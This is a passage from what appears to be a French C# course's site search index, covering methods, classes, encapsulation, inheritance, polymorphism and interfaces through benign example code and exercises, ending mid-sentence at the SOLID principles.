8 caract\u00e8res, une majuscule, une minuscule, un chiffre.  <pre><code>// Votre code ici\n</code></pre> \ud83c\udfcb\ufe0f Exercice 3 : Analyseur de fichier texte  Cr\u00e9ez des m\u00e9thodes pour analyser un texte : 1. `CompterCaracteres(string texte, out int lettres, out int chiffres, out int espaces)` 2. `TrouverMotLePlusLong(string texte)` 3. `CalculerFrequenceMots(string texte)` qui retourne un Dictionary 4. `RemplacerMots(ref string texte, Dictionary remplacements)`  <pre><code>// Votre code ici\n</code></pre> \ud83c\udfcb\ufe0f Exercice 4 : Syst\u00e8me de notes  Cr\u00e9ez un syst\u00e8me de gestion de notes avec : 1. `AjouterNote(List notes, double note)` avec validation (0-20) 2. `CalculerMoyenne(List notes)` 3. `ObtenirStatistiques(List notes, out double min, out double max, out double ecartType)` 4. `AttribuerMention(double moyenne)` qui retourne \"Tr\u00e8s bien\", \"Bien\", etc.  <pre><code>// Votre code ici\n</code></pre> \ud83d\ude80 Bonnes pratiques \u2b50 Conseils pour de bonnes m\u00e9thodes   **1. Nommage clair et descriptif :** <pre><code>// \u274c Mauvais\npublic static int Calc(int x, int y) { return x + y; }\n\n// \u2705 Bon\npublic static int CalculerSomme(int premier, int second) { return premier + second; }\n</code></pre>  **2. Une m\u00e9thode = une responsabilit\u00e9 :** <pre><code>// \u274c Fait trop de choses\npublic static void TraiterUtilisateur(string nom, string email)\n{\n    // Validation\n    // Sauvegarde en base\n    // Envoi d'email\n    // Logging\n}\n\n// \u2705 Responsabilit\u00e9s s\u00e9par\u00e9es\npublic static bool ValiderUtilisateur(string nom, string email) { /* ... */ }\npublic static void SauvegarderUtilisateur(string nom, string email) { /* ... */ }\npublic static void EnvoyerEmailBienvenue(string email) { /* ... */ }\n</code></pre>  **3. \u00c9viter les m\u00e9thodes trop longues :** <pre><code>// \u2705 Si une m\u00e9thode fait plus de 20-30 lignes, la diviser\npublic static void TraiterCommande(Commande commande)\n{\n    ValiderCommande(commande);\n    CalculerPrix(commande);\n    AppliquerRemises(commande);\n    EnregistrerCommande(commande);\n}\n</code></pre>  **4. G\u00e9rer les cas d'erreur :** <pre><code>public static double Diviser(double a, double b)\n{\n    if (b == 0)\n        throw new ArgumentException(\"Division par z\u00e9ro impossible\");\n\n    return a / b;\n}\n</code></pre> \u26a0\ufe0f Erreurs courantes \u00e0 \u00e9viter : <ul> <li>Oublier le return : Dans une m\u00e9thode non-void</li> <li>Modifier des param\u00e8tres : Sans ref/out quand n\u00e9cessaire</li> <li>M\u00e9thodes trop complexes : Diviser en sous-m\u00e9thodes</li> <li>Pas de validation : Toujours valider les param\u00e8tres d'entr\u00e9e</li> </ul> \ud83d\udcda Points cl\u00e9s \u00e0 retenir \ud83c\udfaf R\u00e9sum\u00e9 du chapitre : <ul> <li>M\u00e9thodes : Blocs de code r\u00e9utilisables avec param\u00e8tres et retour</li> <li>Param\u00e8tres : Simples, optionnels, params, ref, out</li> <li>Surcharge : Plusieurs versions avec param\u00e8tres diff\u00e9rents</li> <li>Extensions : Ajouter des m\u00e9thodes aux types existants</li> <li>Bonnes pratiques : Nommage clair, responsabilit\u00e9 unique, gestion d'erreurs</li> </ul>"},{"location":"BTS/B2/B2_4_Fonctions_methodes/#liens-utiles","title":"\ud83d\udd17 Liens utiles","text":"<ul> <li>M\u00e9thodes en C#</li> <li>Param\u00e8tres de m\u00e9thodes</li> <li>M\u00e9thodes d'extension</li> </ul> <p>\u00c9tape pr\u00e9c\u00e9dente : B2.3 - Listes et collections Prochaine \u00e9tape : B2.5 - Programmation Orient\u00e9e Objet</p>"},{"location":"BTS/B2/B2_5_POO_CSharp/","title":"\ud83c\udfd7\ufe0f B2.5 - Programmation Orient\u00e9e Objet en C","text":""},{"location":"BTS/B2/B2_5_POO_CSharp/#objectifs-du-cours","title":"\ud83d\udccb Objectifs du cours","text":"<p>\u00c0 la fin de ce cours, vous serez capable de : - \u2705 Comprendre les concepts fondamentaux de la POO - \u2705 Cr\u00e9er et utiliser des classes et objets - \u2705 Ma\u00eetriser l'encapsulation avec les propri\u00e9t\u00e9s - \u2705 Impl\u00e9menter l'h\u00e9ritage et le polymorphisme - \u2705 Utiliser les interfaces et classes abstraites - \u2705 Appliquer les principes SOLID</p> \ud83c\udfaf Introduction \u00e0 la POO \ud83c\udfd7\ufe0f Qu'est-ce que la Programmation Orient\u00e9e Objet ?  La POO est un paradigme de programmation qui organise le code autour d'objets plut\u00f4t que de fonctions. Un objet combine des donn\u00e9es (attributs) et des comportements (m\u00e9thodes) dans une seule entit\u00e9 coh\u00e9rente.  \ud83d\udd11 Les 4 piliers de la POO : <ul> <li>Encapsulation : Regrouper donn\u00e9es et m\u00e9thodes, contr\u00f4ler l'acc\u00e8s</li> <li>H\u00e9ritage : Cr\u00e9er de nouvelles classes bas\u00e9es sur des classes existantes</li> <li>Polymorphisme : Utiliser une interface commune pour diff\u00e9rents types</li> <li>Abstraction : Simplifier la complexit\u00e9 en cachant les d\u00e9tails</li> </ul> \ud83c\udf0d Analogie du monde r\u00e9el <pre><code>\ud83d\ude97 Voiture (Classe)\n\u251c\u2500\u2500 Attributs : marque, mod\u00e8le, couleur, vitesse\n\u251c\u2500\u2500 M\u00e9thodes : d\u00e9marrer(), acc\u00e9l\u00e9rer(), freiner(), klaxonner()\n\u2514\u2500\u2500 Objets : maVoiture, voitureDeJean, voitureDeMarie\n\n\ud83c\udfe0 Maison (Classe)  \n\u251c\u2500\u2500 Attributs : adresse, superficie, nombrePi\u00e8ces\n\u251c\u2500\u2500 M\u00e9thodes : ouvrir(), fermer(), allumerLumi\u00e8re()\n\u2514\u2500\u2500 Objets : maMaison, maisonVoisin, maisonGrandM\u00e8re\n</code></pre> \ud83c\udfd7\ufe0f Classes et Objets \ud83d\udcdd Cr\u00e9ation d'une classe simple <pre><code>// D\u00e9finition d'une classe Personne\npublic class Personne\n{\n    // Champs (attributs priv\u00e9s)\n    private string nom;\n    private string prenom;\n    private int age;\n    private string email;\n\n    // Constructeur par d\u00e9faut\n    public Personne()\n    {\n        nom = \"\";\n        prenom = \"\";\n        age = 0;\n        email = \"\";\n    }\n\n    // Constructeur avec param\u00e8tres\n    public Personne(string nom, string prenom, int age, string email)\n    {\n        this.nom = nom;\n        this.prenom = prenom;\n        this.age = age;\n        this.email = email;\n    }\n\n    // M\u00e9thodes publiques\n    public void SePresenter()\n    {\n        Console.WriteLine($\"Bonjour, je suis {prenom} {nom}, j'ai {age} ans.\");\n    }\n\n    public void Vieillir()\n    {\n        age++;\n        Console.WriteLine($\"{prenom} a maintenant {age} ans.\");\n    }\n\n    public bool EstMajeur()\n    {\n        return age &gt;= 18;\n    }\n\n    // M\u00e9thode pour afficher les informations\n    public void AfficherInfos()\n    {\n        Console.WriteLine($\"Nom : {nom}\");\n        Console.WriteLine($\"Pr\u00e9nom : {prenom}\");\n        Console.WriteLine($\"\u00c2ge : {age} ans\");\n        Console.WriteLine($\"Email : {email}\");\n        Console.WriteLine($\"Statut : {(EstMajeur() ? \"Majeur\" : \"Mineur\")}\");\n    }\n}\n\n// Utilisation de la classe\nclass Program\n{\n    static void Main(string[] args)\n    {\n        // Cr\u00e9ation d'objets (instances)\n        Personne personne1 = new Personne();\n        Personne personne2 = new Personne(\"Dupont\", \"Jean\", 25, \"jean.dupont@email.com\");\n\n        // Utilisation des m\u00e9thodes\n        personne2.SePresenter();\n        personne2.AfficherInfos();\n        personne2.Vieillir();\n\n        Console.WriteLine($\"Jean est-il majeur ? {personne2.EstMajeur()}\");\n    }\n}\n</code></pre> \ud83d\udd10 Encapsulation avec les propri\u00e9t\u00e9s <pre><code>public class CompteBancaire\n{\n    // Champs priv\u00e9s\n    private string numeroCompte;\n    private double solde;\n    private string titulaire;\n    private DateTime dateOuverture;\n\n    // Propri\u00e9t\u00e9s avec accesseurs\n    public string NumeroCompte\n    {\n        get { return numeroCompte; }\n        private set { numeroCompte = value; } // Seule la classe peut modifier\n    }\n\n    public double Solde\n    {\n        get { return solde; }\n        private set { solde = value; }\n    }\n\n    public string Titulaire\n    {\n        get { return titulaire; }\n        set \n        { \n            if (string.IsNullOrWhiteSpace(value))\n                throw new ArgumentException(\"Le nom du titulaire ne peut pas \u00eatre vide\");\n            titulaire = value; \n        }\n    }\n\n    // Propri\u00e9t\u00e9 auto-impl\u00e9ment\u00e9e\n    public string TypeCompte { get; set; }\n\n    // Propri\u00e9t\u00e9 calcul\u00e9e (lecture seule)\n    public int AnneeOuverture\n    {\n        get { return dateOuverture.Year; }\n    }\n\n    // Constructeur\n    public CompteBancaire(string titulaire, string typeCompte = \"Courant\")\n    {\n        this.numeroCompte = GenererNumeroCompte();\n        this.titulaire = titulaire;\n        this.TypeCompte = typeCompte;\n        this.solde = 0;\n        this.dateOuverture = DateTime.Now;\n    }\n\n    // M\u00e9thodes publiques\n    public bool Deposer(double montant)\n    {\n        if (montant &lt;= 0)\n        {\n            Console.WriteLine(\"Le montant doit \u00eatre positif\");\n            return false;\n        }\n\n        solde += montant;\n        Console.WriteLine($\"D\u00e9p\u00f4t de {montant:C} effectu\u00e9. Nouveau solde : {solde:C}\");\n        return true;\n    }\n\n    public bool Retirer(double montant)\n    {\n        if (montant &lt;= 0)\n        {\n            Console.WriteLine(\"Le montant doit \u00eatre positif\");\n            return false;\n        }\n\n        if (montant &gt; solde)\n        {\n            Console.WriteLine(\"Solde insuffisant\");\n            return false;\n        }\n\n        solde -= montant;\n        Console.WriteLine($\"Retrait de {montant:C} effectu\u00e9. Nouveau solde : {solde:C}\");\n        return true;\n    }\n\n    public void AfficherReleve()\n    {\n        Console.WriteLine(\"=== RELEV\u00c9 DE COMPTE ===\");\n        Console.WriteLine($\"Num\u00e9ro : {NumeroCompte}\");\n        Console.WriteLine($\"Titulaire : {Titulaire}\");\n        Console.WriteLine($\"Type : {TypeCompte}\");\n        Console.WriteLine($\"Solde : {Solde:C}\");\n        Console.WriteLine($\"Ouvert en : {AnneeOuverture}\");\n        Console.WriteLine(\"========================\");\n    }\n\n    // M\u00e9thode priv\u00e9e\n    private string GenererNumeroCompte()\n    {\n        Random random = new Random();\n        return $\"FR{random.Next(10, 100)}{random.Next(1000, 10000)}{random.Next(100000, 1000000)}\";\n    }\n}\n\n// Utilisation\nstatic void Main(string[] args)\n{\n    CompteBancaire compte = new CompteBancaire(\"Alice Martin\", \"\u00c9pargne\");\n\n    compte.Deposer(1000);\n    compte.Retirer(250);\n    compte.AfficherReleve();\n\n    // Acc\u00e8s aux propri\u00e9t\u00e9s\n    Console.WriteLine($\"Titulaire : {compte.Titulaire}\");\n    Console.WriteLine($\"Solde : {compte.Solde}\");\n\n    // compte.Solde = 5000; // \u274c Erreur : propri\u00e9t\u00e9 en lecture seule\n}\n</code></pre> \ud83e\uddec H\u00e9ritage \ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d\udc66 H\u00e9ritage simple Hi\u00e9rarchie d'h\u00e9ritage \ud83e\uddd1 Personne (classe de base) \u251c\u2500\u2500 \ud83d\udc68\u200d\ud83d\udcbc Employe \u2502   \u251c\u2500\u2500 \ud83d\udc68\u200d\ud83d\udcbb Developpeur \u2502   \u2514\u2500\u2500 \ud83d\udc68\u200d\ud83d\udcbc Manager \u2514\u2500\u2500 \ud83c\udf93 Etudiant  <pre><code>// Classe de base (parent)\npublic class Personne\n{\n    protected string nom;\n    protected string prenom;\n    protected int age;\n\n    public string Nom \n    { \n        get { return nom; } \n        set { nom = value; } \n    }\n\n    public string Prenom \n    { \n        get { return prenom; } \n        set { prenom = value; } \n    }\n\n    public int Age \n    { \n        get { return age; } \n        set { age = value; } \n    }\n\n    // Constructeur\n    public Personne(string nom, string prenom, int age)\n    {\n        this.nom = nom;\n        this.prenom = prenom;\n        this.age = age;\n    }\n\n    // M\u00e9thode virtuelle (peut \u00eatre red\u00e9finie)\n    public virtual void SePresenter()\n    {\n        Console.WriteLine($\"Je suis {prenom} {nom}, {age} ans.\");\n    }\n\n    public virtual void AfficherInfos()\n    {\n        Console.WriteLine($\"Nom : {nom}\");\n        Console.WriteLine($\"Pr\u00e9nom : {prenom}\");\n        Console.WriteLine($\"\u00c2ge : {age} ans\");\n    }\n}\n\n// Classe d\u00e9riv\u00e9e (enfant)\npublic class Employe : Personne\n{\n    protected string poste;\n    protected double salaire;\n    protected DateTime dateEmbauche;\n\n    public string Poste \n    { \n        get { return poste; } \n        set { poste = value; } \n    }\n\n    public double Salaire \n    { \n        get { return salaire; } \n        set { salaire = value; } \n    }\n\n    // Constructeur qui appelle le constructeur parent\n    public Employe(string nom, string prenom, int age, string poste, double salaire) \n        : base(nom, prenom, age)\n    {\n        this.poste = poste;\n        this.salaire = salaire;\n        this.dateEmbauche = DateTime.Now;\n    }\n\n    // Red\u00e9finition (override) de la m\u00e9thode parent\n    public override void SePresenter()\n    {\n        Console.WriteLine($\"Je suis {prenom} {nom}, {age} ans, {poste} dans l'entreprise.\");\n    }\n\n    public override void AfficherInfos()\n    {\n        base.AfficherInfos(); // Appel de la m\u00e9thode parent\n        Console.WriteLine($\"Poste : {poste}\");\n        Console.WriteLine($\"Salaire : {salaire:C}\");\n        Console.WriteLine($\"Embauch\u00e9 le : {dateEmbauche:dd/MM/yyyy}\");\n    }\n\n    // Nouvelle m\u00e9thode sp\u00e9cifique \u00e0 Employe\n    public void Travailler()\n    {\n        Console.WriteLine($\"{prenom} travaille en tant que {poste}.\");\n    }\n\n    public virtual double CalculerPrimeAnnuelle()\n    {\n        return salaire * 0.1; // 10% du salaire\n    }\n}\n\n// Classe d\u00e9riv\u00e9e de Employe\npublic class Developpeur : Employe\n{\n    private List&lt;string&gt; langagesProgrammation;\n    private string specialite;\n\n    public List&lt;string&gt; LangagesProgrammation \n    { \n        get { return langagesProgrammation; } \n    }\n\n    public string Specialite \n    { \n        get { return specialite; } \n        set { specialite = value; } \n    }\n\n    public Developpeur(string nom, string prenom, int age, double salaire, string specialite) \n        : base(nom, prenom, age, \"D\u00e9veloppeur\", salaire)\n    {\n        this.specialite = specialite;\n        this.langagesProgrammation = new List&lt;string&gt;();\n    }\n\n    public override void SePresenter()\n    {\n        Console.WriteLine($\"Je suis {prenom} {nom}, d\u00e9veloppeur {specialite} de {age} ans.\");\n    }\n\n    public override void AfficherInfos()\n    {\n        base.AfficherInfos();\n        Console.WriteLine($\"Sp\u00e9cialit\u00e9 : {specialite}\");\n        Console.WriteLine($\"Langages : {string.Join(\", \", langagesProgrammation)}\");\n    }\n\n    public void AjouterLangage(string langage)\n    {\n        if (!langagesProgrammation.Contains(langage))\n        {\n            langagesProgrammation.Add(langage);\n            Console.WriteLine($\"{langage} ajout\u00e9 aux comp\u00e9tences de {prenom}\");\n        }\n    }\n\n    public void Programmer()\n    {\n        Console.WriteLine($\"{prenom} programme en {specialite}.\");\n    }\n\n    // Red\u00e9finition du calcul de prime\n    public override double CalculerPrimeAnnuelle()\n    {\n        double primeBase = base.CalculerPrimeAnnuelle();\n        double bonusLangages = langagesProgrammation.Count * 500; // 500\u20ac par langage\n        return primeBase + bonusLangages;\n    }\n}\n\n// Autre classe d\u00e9riv\u00e9e\npublic class Etudiant : Personne\n{\n    private string ecole;\n    private string filiere;\n    private int anneeEtude;\n\n    public string Ecole { get; set; }\n    public string Filiere { get; set; }\n    public int AnneeEtude { get; set; }\n\n    public Etudiant(string nom, string prenom, int age, string ecole, string filiere, int anneeEtude) \n        : base(nom, prenom, age)\n    {\n        this.ecole = ecole;\n        this.filiere = filiere;\n        this.anneeEtude = anneeEtude;\n    }\n\n    public override void SePresenter()\n    {\n        Console.WriteLine($\"Je suis {prenom} {nom}, \u00e9tudiant en {filiere} (ann\u00e9e {anneeEtude}) \u00e0 {ecole}.\");\n    }\n\n    public override void AfficherInfos()\n    {\n        base.AfficherInfos();\n        Console.WriteLine($\"\u00c9cole : {ecole}\");\n        Console.WriteLine($\"Fili\u00e8re : {filiere}\");\n        Console.WriteLine($\"Ann\u00e9e : {anneeEtude}\");\n    }\n\n    public void Etudier()\n    {\n        Console.WriteLine($\"{prenom} \u00e9tudie {filiere}.\");\n    }\n}\n\n// Utilisation\nstatic void Main(string[] args)\n{\n    // Cr\u00e9ation d'objets de diff\u00e9rents types\n    Personne personne = new Personne(\"Martin\", \"Paul\", 30);\n    Employe employe = new Employe(\"Durand\", \"Marie\", 28, \"Comptable\", 35000);\n    Developpeur dev = new Developpeur(\"Moreau\", \"Alex\", 26, 45000, \"Full-Stack\");\n    Etudiant etudiant = new Etudiant(\"Petit\", \"Julie\", 20, \"Universit\u00e9 Paris\", \"Informatique\", 2);\n\n    // Ajout de comp\u00e9tences au d\u00e9veloppeur\n    dev.AjouterLangage(\"C#\");\n    dev.AjouterLangage(\"JavaScript\");\n    dev.AjouterLangage(\"Python\");\n\n    // Polymorphisme : m\u00eame m\u00e9thode, comportements diff\u00e9rents\n    List&lt;Personne&gt; personnes = new List&lt;Personne&gt; { personne, employe, dev, etudiant };\n\n    foreach (Personne p in personnes)\n    {\n        p.SePresenter(); // Appel polymorphe\n        p.AfficherInfos();\n        Console.WriteLine($\"Prime annuelle : {(p is Employe emp ? emp.CalculerPrimeAnnuelle().ToString(\"C\") : \"N/A\")}\");\n        Console.WriteLine(\"---\");\n    }\n}\n</code></pre> \ud83c\udfad Polymorphisme \ud83d\udd04 Polymorphisme par h\u00e9ritage <pre><code>// Classe de base abstraite\npublic abstract class Animal\n{\n    protected string nom;\n    protected int age;\n\n    public string Nom { get; set; }\n    public int Age { get; set; }\n\n    public Animal(string nom, int age)\n    {\n        this.nom = nom;\n        this.age = age;\n    }\n\n    // M\u00e9thode abstraite (doit \u00eatre impl\u00e9ment\u00e9e par les classes d\u00e9riv\u00e9es)\n    public abstract void FaireDuBruit();\n\n    // M\u00e9thode virtuelle (peut \u00eatre red\u00e9finie)\n    public virtual void SeDeplacer()\n    {\n        Console.WriteLine($\"{nom} se d\u00e9place.\");\n    }\n\n    // M\u00e9thode concr\u00e8te\n    public void Dormir()\n    {\n        Console.WriteLine($\"{nom} dort paisiblement.\");\n    }\n}\n\npublic class Chien : Animal\n{\n    private string race;\n\n    public string Race { get; set; }\n\n    public Chien(string nom, int age, string race) : base(nom, age)\n    {\n        this.race = race;\n    }\n\n    public override void FaireDuBruit()\n    {\n        Console.WriteLine($\"{nom} aboie : Woof! Woof!\");\n    }\n\n    public override void SeDeplacer()\n    {\n        Console.WriteLine($\"{nom} court joyeusement.\");\n    }\n\n    public void Jouer()\n    {\n        Console.WriteLine($\"{nom} joue avec une balle.\");\n    }\n}\n\npublic class Chat : Animal\n{\n    private string couleur;\n\n    public string Couleur { get; set; }\n\n    public Chat(string nom, int age, string couleur) : base(nom, age)\n    {\n        this.couleur = couleur;\n    }\n\n    public override void FaireDuBruit()\n    {\n        Console.WriteLine($\"{nom} miaule : Miaou! Miaou!\");\n    }\n\n    public override void SeDeplacer()\n    {\n        Console.WriteLine($\"{nom} se faufile silencieusement.\");\n    }\n\n    public void Chasser()\n    {\n        Console.WriteLine($\"{nom} chasse une souris.\");\n    }\n}\n\npublic class Oiseau : Animal\n{\n    private double envergure;\n\n    public double Envergure { get; set; }\n\n    public Oiseau(string nom, int age, double envergure) : base(nom, age)\n    {\n        this.envergure = envergure;\n    }\n\n    public override void FaireDuBruit()\n    {\n        Console.WriteLine($\"{nom} chante : Cui cui!\");\n    }\n\n    public override void SeDeplacer()\n    {\n        Console.WriteLine($\"{nom} vole gracieusement.\");\n    }\n\n    public void Voler()\n    {\n        Console.WriteLine($\"{nom} vole avec une envergure de {envergure}m.\");\n    }\n}\n\n// Utilisation du polymorphisme\nstatic void Main(string[] args)\n{\n    // Cr\u00e9ation d'un zoo polymorphe\n    List&lt;Animal&gt; zoo = new List&lt;Animal&gt;\n    {\n        new Chien(\"Rex\", 5, \"Berger Allemand\"),\n        new Chat(\"Minou\", 3, \"Gris\"),\n        new Oiseau(\"Tweety\", 2, 0.3),\n        new Chien(\"Buddy\", 7, \"Golden Retriever\"),\n        new Chat(\"F\u00e9lix\", 4, \"Noir et blanc\")\n    };\n\n    Console.WriteLine(\"=== CONCERT DU ZOO ===\");\n    foreach (Animal animal in zoo)\n    {\n        animal.FaireDuBruit(); // Polymorphisme !\n    }\n\n    Console.WriteLine(\"\\n=== HEURE DE L'EXERCICE ===\");\n    foreach (Animal animal in zoo)\n    {\n        animal.SeDeplacer(); // Polymorphisme !\n    }\n\n    Console.WriteLine(\"\\n=== ACTIVIT\u00c9S SP\u00c9CIFIQUES ===\");\n    foreach (Animal animal in zoo)\n    {\n        // V\u00e9rification de type et casting\n        if (animal is Chien chien)\n        {\n            chien.Jouer();\n        }\n        else if (animal is Chat chat)\n        {\n            chat.Chasser();\n        }\n        else if (animal is Oiseau oiseau)\n        {\n            oiseau.Voler();\n        }\n    }\n\n    Console.WriteLine(\"\\n=== HEURE DU DODO ===\");\n    foreach (Animal animal in zoo)\n    {\n        animal.Dormir(); // M\u00e9thode commune\n    }\n}\n</code></pre> \ud83d\udd0c Interfaces <pre><code>// Interface pour les objets volants\npublic interface IVolant\n{\n    double AltitudeMax { get; }\n    void Decoller();\n    void Atterrir();\n    void Voler(double altitude);\n}\n\n// Interface pour les v\u00e9hicules\npublic interface IVehicule\n{\n    string Marque { get; set; }\n    string Modele { get; set; }\n    int AnneeProduction { get; set; }\n    bool EstDemarre { get; }\n\n    void Demarrer();\n    void Arreter();\n    void Accelerer();\n    void Freiner();\n}\n\n// Interface pour les objets \u00e9lectriques\npublic interface IElectrique\n{\n    double NiveauBatterie { get; }\n    double AutonomieKm { get; }\n\n    void Charger();\n    bool EstCharge();\n}\n\n// Classe qui impl\u00e9mente plusieurs interfaces\npublic class Avion : IVolant, IVehicule\n{\n    public string Marque { get; set; }\n    public string Modele { get; set; }\n    public int AnneeProduction { get; set; }\n    public bool EstDemarre { get; private set; }\n    public double AltitudeMax { get; private set; }\n\n    private double altitudeActuelle;\n    private bool estEnVol;\n\n    public Avion(string marque, string modele, int annee, double altitudeMax)\n    {\n        Marque = marque;\n        Modele = modele;\n        AnneeProduction = annee;\n        AltitudeMax = altitudeMax;\n        EstDemarre = false;\n        altitudeActuelle = 0;\n        estEnVol = false;\n    }\n\n    // Impl\u00e9mentation de IVehicule\n    public void Demarrer()\n    {\n        EstDemarre = true;\n        Console.WriteLine($\"{Marque} {Modele} : Moteurs d\u00e9marr\u00e9s !\");\n    }\n\n    public void Arreter()\n    {\n        if (estEnVol)\n        {\n            Console.WriteLine(\"Impossible d'arr\u00eater en vol !\");\n            return;\n        }\n        EstDemarre = false;\n        Console.WriteLine($\"{Marque} {Modele} : Moteurs arr\u00eat\u00e9s.\");\n    }\n\n    public void Accelerer()\n    {\n        if (EstDemarre)\n            Console.WriteLine($\"{Marque} {Modele} acc\u00e9l\u00e8re sur la piste.\");\n    }\n\n    public void Freiner()\n    {\n        Console.WriteLine($\"{Marque} {Modele} freine.\");\n    }\n\n    // Impl\u00e9mentation de IVolant\n    public void Decoller()\n    {\n        if (!EstDemarre)\n        {\n            Console.WriteLine(\"D\u00e9marrez d'abord les moteurs !\");\n            return;\n        }\n\n        estEnVol = true;\n        altitudeActuelle = 1000;\n        Console.WriteLine($\"{Marque} {Modele} d\u00e9colle ! Altitude : {altitudeActuelle}m\");\n    }\n\n    public void Atterrir()\n    {\n        if (!estEnVol)\n        {\n            Console.WriteLine(\"L'avion est d\u00e9j\u00e0 au sol !\");\n            return;\n        }\n\n        estEnVol = false;\n        altitudeActuelle = 0;\n        Console.WriteLine($\"{Marque} {Modele} atterrit en douceur.\");\n    }\n\n    public void Voler(double altitude)\n    {\n        if (!estEnVol)\n        {\n            Console.WriteLine(\"L'avion doit d'abord d\u00e9coller !\");\n            return;\n        }\n\n        if (altitude &gt; AltitudeMax)\n        {\n            Console.WriteLine($\"Altitude maximale d\u00e9pass\u00e9e ! Max : {AltitudeMax}m\");\n            return;\n        }\n\n        altitudeActuelle = altitude;\n        Console.WriteLine($\"{Marque} {Modele} vole \u00e0 {altitudeActuelle}m d'altitude.\");\n    }\n}\n\n// Classe voiture \u00e9lectrique\npublic class VoitureElectrique : IVehicule, IElectrique\n{\n    public string Marque { get; set; }\n    public string Modele { get; set; }\n    public int AnneeProduction { get; set; }\n    public bool EstDemarre { get; private set; }\n    public double NiveauBatterie { get; private set; }\n    public double AutonomieKm { get; private set; }\n\n    private double vitesse;\n\n    public VoitureElectrique(string marque, string modele, int annee, double autonomie)\n    {\n        Marque = marque;\n        Modele = modele;\n        AnneeProduction = annee;\n        AutonomieKm = autonomie;\n        NiveauBatterie = 100;\n        EstDemarre = false;\n        vitesse = 0;\n    }\n\n    // Impl\u00e9mentation de IVehicule\n    public void Demarrer()\n    {\n        if (NiveauBatterie &lt;= 0)\n        {\n            Console.WriteLine(\"Batterie vide ! Rechargez d'abord.\");\n            return;\n        }\n\n        EstDemarre = true;\n        Console.WriteLine($\"{Marque} {Modele} d\u00e9marre silencieusement \u26a1\");\n    }\n\n    public void Arreter()\n    {\n        EstDemarre = false;\n        vitesse = 0;\n        Console.WriteLine($\"{Marque} {Modele} s'arr\u00eate.\");\n    }\n\n    public void Accelerer()\n    {\n        if (!EstDemarre)\n        {\n            Console.WriteLine(\"D\u00e9marrez d'abord la voiture !\");\n            return;\n        }\n\n        vitesse += 10;\n        NiveauBatterie -= 0.5;\n        Console.WriteLine($\"{Marque} {Modele} acc\u00e9l\u00e8re \u00e0 {vitesse} km/h. Batterie : {NiveauBatterie:F1}%\");\n    }\n\n    public void Freiner()\n    {\n        vitesse = Math.Max(0, vitesse - 15);\n        NiveauBatterie += 0.2; // R\u00e9cup\u00e9ration d'\u00e9nergie\n        Console.WriteLine($\"{Marque} {Modele} freine \u00e0 {vitesse} km/h. Batterie : {NiveauBatterie:F1}%\");\n    }\n\n    // Impl\u00e9mentation de IElectrique\n    public void Charger()\n    {\n        Console.WriteLine($\"Chargement de {Marque} {Modele}...\");\n        NiveauBatterie = 100;\n        Console.WriteLine(\"Chargement termin\u00e9 ! Batterie : 100%\");\n    }\n\n    public bool EstCharge()\n    {\n        return NiveauBatterie &gt; 80;\n    }\n}\n\n// Utilisation des interfaces\nstatic void Main(string[] args)\n{\n    // Cr\u00e9ation d'objets\n    Avion boeing = new Avion(\"Boeing\", \"737\", 2020, 12000);\n    VoitureElectrique tesla = new VoitureElectrique(\"Tesla\", \"Model 3\", 2023, 500);\n\n    // Utilisation polymorphe via les interfaces\n    List&lt;IVehicule&gt; vehicules = new List&lt;IVehicule&gt; { boeing, tesla };\n\n    Console.WriteLine(\"=== D\u00c9MARRAGE DES V\u00c9HICULES ===\");\n    foreach (IVehicule vehicule in vehicules)\n    {\n        vehicule.Demarrer();\n        vehicule.Accelerer();\n    }\n\n    Console.WriteLine(\"\\n=== OBJETS VOLANTS ===\");\n    if (boeing is IVolant avionVolant)\n    {\n        avionVolant.Decoller();\n        avionVolant.Voler(8000);\n        avionVolant.Atterrir();\n    }\n\n    Console.WriteLine(\"\\n=== V\u00c9HICULES \u00c9LECTRIQUES ===\");\n    if (tesla is IElectrique vehiculeElectrique)\n    {\n        Console.WriteLine($\"Autonomie : {vehiculeElectrique.AutonomieKm} km\");\n        Console.WriteLine($\"Charg\u00e9 : {vehiculeElectrique.EstCharge()}\");\n\n        // Simulation de conduite\n        for (int i = 0; i &lt; 10; i++)\n        {\n            tesla.Accelerer();\n        }\n\n        vehiculeElectrique.Charger();\n    }\n}\n</code></pre> \ud83c\udfaf Exercices pratiques \ud83c\udfcb\ufe0f Exercice 1 : Syst\u00e8me de gestion de biblioth\u00e8que  Cr\u00e9ez un syst\u00e8me de gestion de biblioth\u00e8que avec :  1. **Classe abstraite `Document`** avec :    - Propri\u00e9t\u00e9s : Titre, Auteur, AnneePublication, EstEmprunte    - M\u00e9thodes abstraites : Emprunter(), Retourner()    - M\u00e9thode virtuelle : AfficherInfos()  2. **Classes d\u00e9riv\u00e9es :**    - `Livre` : ISBN, NombrePages, Genre    - `Magazine` : NumeroEdition, Periodicite    - `DVD` : Duree, Genre, Realisateur  3. **Interface `IEmpruntable`** avec :    - DateEmprunt, DateRetourPrevue    - CalculerRetard(), CalculerAmende()  <pre><code>// Votre code ici\n</code></pre> \ud83c\udfcb\ufe0f Exercice 2 : Jeu de r\u00f4le (RPG)  Cr\u00e9ez un syst\u00e8me de personnages pour un jeu de r\u00f4le :  1. **Classe de base `Personnage`** :    - Nom, Niveau, PointsVie, PointsMana    - M\u00e9thodes : Attaquer(), RecevoirDegats(), Guerir()  2. **Classes sp\u00e9cialis\u00e9es :**    - `Guerrier` : Force, Armure, AttaqueEpee()    - `Mage` : Intelligence, LancerSort(), RegenereMana()    - `Archer` : Agilite, Precision, TirerFleche()  3. **Interfaces :**    - `ICombattant` : Attaquer(), Defendre()    - `IMagique` : LancerSort(), ConsommerMana()  <pre><code>// Votre code ici\n</code></pre> \ud83c\udfcb\ufe0f Exercice 3 : Syst\u00e8me de formes g\u00e9om\u00e9triques  Impl\u00e9mentez un syst\u00e8me de calcul de formes :  1. **Classe abstraite `Forme`** :    - Propri\u00e9t\u00e9s : Couleur, Position    - M\u00e9thodes abstraites : CalculerAire(), CalculerPerimetre()    - M\u00e9thode virtuelle : Dessiner()  2. **Classes concr\u00e8tes :**    - `Rectangle`, `Cercle`, `Triangle`    - Chaque classe avec ses propri\u00e9t\u00e9s sp\u00e9cifiques  3. **Interface `IRedimensionnable`** :    - Redimensionner(double facteur)  <pre><code>// Votre code ici\n</code></pre> \ud83c\udfc6 Principes SOLID \ud83c\udfaf Les 5 principes SOLID   **S - Single Responsibility Principle (SRP)** Une classe ne doit avoir qu'une seule raison de changer.  **O - Open/Closed Principle (OCP)**   Les classes doivent \u00eatre ouvertes \u00e0 